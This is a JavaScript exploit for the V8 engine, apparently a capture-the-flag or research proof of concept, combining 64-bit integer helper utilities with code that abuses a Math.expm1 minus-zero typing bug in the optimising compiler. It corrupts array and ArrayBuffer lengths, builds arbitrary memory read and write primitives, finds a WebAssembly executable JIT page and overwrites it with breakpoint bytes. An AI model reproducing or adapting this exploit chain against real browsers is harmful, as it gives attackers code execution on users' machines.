//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// modified from https://github.com/LiveOverflow/lo_nintendoswitch/blob/master/opc1.html#L36
function gc() {
    var x = new Array(0x800);
    for(y = 0; y < x.length; y++) {
        x[y] = new Uint32Array(0x10000);
    }
    for(y = 0; y < x.length; y++) {
        x[y] = 0;
    }
}

function do_expm(x) {
	return Math.expm1(x);
}

function spooky(obj, x, k) {
	obj.b = do_expm(x);
	return (+Object.is(obj.b, obj.a));
}

var g_oob = undefined;
var victim = undefined;
var manip = undefined;

var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 
	0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128,
	0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129,
	128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109,
	111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128,
	128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11
]);
var m = new WebAssembly.Instance(new WebAssembly.Module(buffer));
console.log("ret = " + m.exports.main());

//%DebugPrint(m.exports.main);
//readline();

function f(x, k, v) {

	let o = {a: -0};
	let oob = [1.1, 1.2];
	let localvictim = [2.2, 2.2, 2.2, 2.2, 2.2];

	// save off our victim pointer
	victim = localvictim;

	manip = [new ArrayBuffer(0x100), new ArrayBuffer(0x100)];

	// putting this between the previous and next lines prevents
	// load elimination from simplifying the calls, and instead
	// delegates that responsibility to escape analysis


	// for some reason, turbofan is much more willing to kill
	// the CheckBounds surrounding the OOB read than the OOB write.
	// need to investigate this more, but for now....
    let idx = spooky(o, x, k) * 12;
    oob[idx] = 8.691694759794e-311; // 0x0000100000000000

    return localvictim;
}

// starting check of our return value
var res = f(0, 0, 1.1);
//if (res != 1.1) throw ("invalid start input " + res);

// call as normal
for(x = 0; x < 0x5000; x++) f(0, x % 2, 1.1);

// force jit of f()
f("0", 0, 1.1);
for(x = 0; x < 0x5000; x++) f(0, x % 2, 1.1);

res = f(-0, 1, 5.5);
//if (res != 2.2) throw ("invalid end input " + res);

f(-0, 1, 0);

// make sure we corrupted the victim's length
if (victim.length != 0x1000) throw "couldn't corrupt victim length";

// put some other things into the array we want to get the address of
manip.push(0x41414141);
manip.push(m.exports.main);

// find the manip length and replace it
var length_idx = 0;
var bs_idx = 0;
var addrof_idx = 0;
var found = false;
for(x = 0; x < 0x100; x++) {
	if (!found && (victim[x] == 5.43230922487e-312 || victim[x] == 1.265e-321)) {
		victim[x] = 2.53e-321; // 0x200
		length_idx = x;
		bs_idx = x + 1;
		console.log("found arraybuf and store idx");
		found = true;
	}
	if (victim[x] == 2261634.0) {
		addrof_idx = x;
		console.log("found addrof idx");

		// this will always be after the above
		break;
	}
}

// make sure we corrupted arraybuffer length
if (manip[0].byteLength != 0x200) throw "couldn't corrupt arraybuf length";

var manipulate = manip[0];

// set up our primitives
function r64(addr) {
    victim[bs_idx] = addr.asDouble();
    var myview = new Float64Array(manipulate);
    return Int64.fromDouble(myview[0]);
}

function writen(addr, data) {
    victim[bs_idx] = addr.asDouble();
    var myview = new Uint8Array(manipulate);
    for(x = 0; x < data.length; x++) {
        myview[x] = data[x];
    }
}

%DebugPrint(m.exports.main);
%DebugPrint(victim);
%DebugPrint(manip);
%DebugPrint(manip[0]);
var func = Int64.fromDouble(victim[addrof_idx+1]);
console.log("wasm func at " + func.toString());

// function + 0x20 ] + 0x10 ] + 0x1d0 == rwx jitbuffer on my chrome version
// add 0xf to align the pointers

func = Add(func, new Int64(0x2f));
func = r64(func);
console.log(func);
console.log(func);
func = Add(func, new Int64(0x1f));
func = r64(func);
console.log(func);
func = Add(func, new Int64(0x1df));
var jitptr_loc = func;
func = r64(func);
console.log("wasm jitbuffer is " + func.toString());

// overwrite jit page with code
writen(func, [0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc]);

m.exports.main();

readline();
